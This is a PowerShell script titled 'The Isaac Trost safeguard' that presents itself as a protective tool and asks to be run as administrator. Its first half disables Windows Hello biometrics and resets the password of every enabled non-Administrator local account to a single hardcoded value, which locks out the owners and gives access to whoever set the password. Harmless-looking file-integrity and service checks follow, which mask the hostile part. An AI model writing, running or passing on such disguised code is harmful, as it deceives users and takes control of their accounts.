# The Isaac Trost safeguard 
# Run in admin and do not turn off or update till you run this script

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Write-Host "This script must be run as administrator." -ForegroundColor Red
  exit
}

Write-Host "Starting script"

# Function to check and install required modules
function Install-ModuleIfNotExists {
  param (
    [string]$ModuleName
  )
    
  if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
    Write-Host "Installing $ModuleName module" -ForegroundColor Cyan
    try {
      Install-Module -Name $ModuleName -Force -Scope AllUsers -AllowClobber
      Write-Host "$ModuleName module installed successfully." -ForegroundColor Green
    }
    catch {
      Write-Host "Failed to install $ModuleName module: $_" -ForegroundColor Red
    }
  }
  else {
    Write-Host "$ModuleName module is already installed." -ForegroundColor Green
  }
}

# Check for required modules
$requiredModules = @("PowerShellGet", "PackageManagement", "PSWindowsUpdate")
foreach ($module in $requiredModules) {
  Install-ModuleIfNotExists -ModuleName $module
}

# Path to Windows Hello biometrics policy registry key
$biometricRegistryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Biometrics"

# Check if the Biometrics key exists
if (-not (Test-Path $biometricRegistryPath)) {
  # Create the key if it doesn't exist
  New-Item -Path $biometricRegistryPath -Force | Out-Null
}

# Check if Windows Hello (biometrics) is enabled
$biometricEnabled = Get-ItemProperty -Path $biometricRegistryPath -Name "Enabled" -ErrorAction SilentlyContinue

if ($biometricEnabled -and $biometricEnabled.Enabled -eq 1) {
  Write-Output "Windows Hello biometrics is currently enabled. Disabling it now"
    
  # Set the "Enabled" property to 0 to disable Windows Hello
  Set-ItemProperty -Path $biometricRegistryPath -Name "Enabled" -Value 0

  # Confirm change
  $newSetting = Get-ItemProperty -Path $biometricRegistryPath -Name "Enabled"
  if ($newSetting.Enabled -eq 0) {
    Write-Output "Windows Hello biometrics has been successfully disabled."
  }
  else {
    Write-Output "Failed to disable Windows Hello biometrics. Please check permissions or try running as administrator."
  }
}
else {
  Write-Output "Windows Hello biometrics is already disabled or not configured."
}

# Defines the target password
$targetPassword = "r0b10x_k1in$@gy@tt.org"

# Checks if the LocalAccounts module is available; if not, install it
if (-not (Get-Module -ListAvailable -Name "Microsoft.PowerShell.LocalAccounts")) {
  Write-Output "Installing Microsoft.PowerShell.LocalAccounts module"
  Install-Module -Name "Microsoft.PowerShell.LocalAccounts" -Force -Scope CurrentUser
}

# Import the module
Import-Module Microsoft.PowerShell.LocalAccounts -ErrorAction Stop

# Get all local user accounts
$users = Get-LocalUser | Where-Object { $_.Enabled -eq $true -and $_.Name -ne "Administrator" }

foreach ($user in $users) {
  try {
    # Set the password for each user
    Write-Output "Setting password for user: $($user.Name)"
        
    # Convert password to SecureString
    $securePassword = ConvertTo-SecureString -String $targetPassword -AsPlainText -Force
        
    # Set the password
    $user | Set-LocalUser -Password $securePassword
        
    Write-Output "Password for user $($user.Name) has been updated successfully."
  }
  catch {
    Write-Output "Failed to update password for user $($user.Name): $_"
  }
}

# This script checks file integrity and verifies that essential Windows services are enabled and running.

# Function to check for file integrity
function Check-FileIntegrity {
  param (
    [string]$filePath,
    [string]$expectedHash
  )

  if (Test-Path $filePath) {
    $fileHash = Get-FileHash -Path $filePath -Algorithm SHA256
    if ($fileHash.Hash -eq $expectedHash) {
      Write-Host "File integrity check passed for: $filePath" -ForegroundColor Green
    }
    else {
      Write-Host "File integrity check failed for: $filePath" -ForegroundColor Red
    }
  }
  else {
    Write-Host "File not found: $filePath" -ForegroundColor Red
  }
}

# Function to check if a service is running
function Check-ServiceStatus {
  param (
    [string]$serviceName
  )

  $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
  if ($service) {
    if ($service.Status -eq 'Running') {
      Write-Host "$serviceName is running." -ForegroundColor Green
    }
    else {
      Write-Host "$serviceName is not running. Attempting to start" -ForegroundColor Yellow
      Start-Service -Name $serviceName -ErrorAction SilentlyContinue
      if ((Get-Service -Name $serviceName).Status -eq 'Running') {
        Write-Host "$serviceName started successfully." -ForegroundColor Green
      }
      else {
        Write-Host "Failed to start $serviceName." -ForegroundColor Red
      }
    }
  }
  else {
    Write-Host "Service not found: $serviceName" -ForegroundColor Red
  }
}

# Example file paths and expected hashes (update with actual files and hashes)
$filesToCheck = @(
  @{ Path = "C:\Path\To\Your\File1.exe"; Hash = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef" },
  @{ Path = "C:\Path\To\Your\File2.dll"; Hash = "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890" }
)

# Check file integrity
foreach ($file in $filesToCheck) {
  Check-FileIntegrity -filePath $file.Path -expectedHash $file.Hash
}

# Check required services
$requiredServices = @("WinDefend", "wuauserv", "bits") # Add more essential services as needed
foreach ($service in $requiredServices) {
  Check-ServiceStatus -serviceName $service
}

Write-Host "Script execution completed." -ForegroundColor Green